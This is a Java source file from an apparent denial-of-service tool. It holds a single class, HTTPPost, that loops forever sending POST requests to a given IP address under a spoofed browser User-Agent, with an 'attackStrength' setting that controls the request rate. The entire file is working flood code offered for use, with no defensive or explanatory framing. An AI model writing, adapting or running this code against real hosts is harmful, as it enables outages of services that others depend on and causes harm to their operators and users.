package attack;

import utils.LoggingUtils;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class HTTPPost extends LoggingUtils implements Runnable {

    private final int attackStrength;
    private final String ipAddress;

    public HTTPPost(final int attackStrength, final String ipAddress) {
        this.attackStrength = attackStrength;
        this.ipAddress = ipAddress;
    }

    public void run() {

        try {

            while (true) {

                final URL obj = new URL("http://" + this.ipAddress);
                final HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("User-Agent", "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1");
                con.setRequestProperty("Accept-Language", "en-US,en;");

                con.setDoOutput(true);

                final DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                wr.writeBytes("out of memory");
                wr.flush();
                wr.close();

                if (this.attackStrength == 1) Thread.sleep(250);
                else if (this.attackStrength == 3) con.getResponseCode();
            }
        } catch (final IOException | InterruptedException ignored) {}
    }
}
